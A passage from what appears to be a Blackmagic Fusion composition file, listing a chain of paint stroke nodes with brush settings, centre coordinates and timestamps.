				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.492122888565063, 0.206774324178696 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke138 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378998554 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke137"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.506695568561554, 0.230011820793152 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke137 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378996875 }
			},
			IsThreaded = true,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke136"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.499606132507324, 0.235919654369354 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke136 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378995149 }
			},
			IsThreaded = true,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke135"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.532296180725098, 0.272548258304596 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke135 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378993680 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke134"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.52363133430481, 0.300118148326874 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke134 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378992254 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke133"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.531902313232422, 0.333989769220352 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke133 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378990110 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke132"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.565380096435547, 0.349350124597549 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke132 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378987154 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke131"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.530326902866364, 0.398188263177872 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke131 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378985369 }
			},
			IsThreaded = true,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke130"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.423198103904724, 0.44505712389946 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke130 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378984379 }
			},
			IsThreaded = true,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke129"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.419653415679932, 0.434816867113113 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke129 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378982579 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke128"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.356242626905441, 0.428909033536911 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke128 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378980839 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke127"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.346396207809448, 0.410791635513306 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke127 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378978724 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke126"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.323552578687668, 0.44033083319664 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke126 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378977509 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke125"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.309373766183853, 0.415911763906479 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke125 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378975709 }
			},
			IsThreaded = true,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke124"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.307010620832443, 0.447420239448547 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke124 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378973924 }
			},
			IsThreaded = true,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke123"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.364513576030731, 0.480504125356674 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke123 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378972349 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke122"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.31646317243576, 0.523434400558472 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke122 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378970369 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke121"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.553958237171173, 0.472233176231384 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke121 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378968389 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke120"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.505120098590851, 0.50374162197113 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke120 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378965584 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke119"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.673296570777893, 0.499409228563309 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke119 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378964129 }
			},
			IsThreaded = true,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke118"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.701260328292847, 0.414336353540421 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke118 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378962629 }
			},
			IsThreaded = true,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke117"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.753643155097961, 0.364316672086716 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke117 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378960799 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke116"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.806419849395752, 0.387554168701172 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke116 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378958474 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke115"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.802481293678284, 0.542339503765106 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke115 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378956254 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke114"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.987593531608582, 0.37928318977356 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke114 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378953959 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke113"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.885584890842438, 0.497046083211899 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke113 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378950944 }
			},
			IsThreaded = true,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke112"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.892674267292023, 0.578574240207672 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke112 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378947764 }
			},
			IsThreaded = true,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke111"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.794998049736023, 0.609688878059387 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke111 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378945979 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke110"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.759157121181488, 0.608113408088684 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke110 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378944569 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke109"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.760338723659515, 0.622686088085175 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke109 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378942964 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke108"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.830838918685913, 0.637258768081665 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke108 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378941389 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke107"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.778456091880798, 0.646317422389984 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke107 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378940414 }
			},
			IsThreaded = true,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke106"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.796573460102081, 0.679795205593109 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke106 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378929793 }
			},
			IsThreaded = true,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke105"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.709137439727783, 0.679007470607758 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke105 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378928519 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke104"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.690232396125793, 0.651831448078156 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke104 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378925984 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke103"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.870224475860596, 0.683733761310577 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke103 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378923314 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke102"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.804844439029694, 0.711697518825531 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke102 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378921649 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke101"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.765852689743042, 0.717999219894409 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke101 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378919759 }
			},
			IsThreaded = true,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke100"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.856833398342133, 0.747144520282745 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke100 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378917629 }
			},
			IsThreaded = true,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke99"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.734344244003296, 0.744387567043304 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke99 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378916234 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke98"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.728042542934418, 0.741630554199219 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke98 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378914869 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke97"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.706774294376373, 0.733753442764282 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke97 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378913099 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke96"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.676053583621979, 0.697124838829041 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke96 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378911074 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke95"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.642181932926178, 0.695549428462982 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke95 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378909499 }
			},
			IsThreaded = true,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke94"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.577195763587952, 0.642378866672516 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke94 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378907744 }
			},
			IsThreaded = true,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke93"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.673690438270569, 0.746750712394714 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke93 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378905853 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke92"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.64060652256012, 0.730602622032166 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke92 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378902884 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke91"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.854076385498047, 0.799133539199829 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke91 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378900574 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke90"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.836746752262115, 0.8089799284935 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke90 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378898609 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke89"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.826900362968445, 0.845214664936066 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke89 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378896749 }
			},
			IsThreaded = true,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke88"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.715833008289337, 0.811736881732941 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke88 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378894994 }
			},
			IsThreaded = true,
			Brushes = {
				""SoftBrush"",
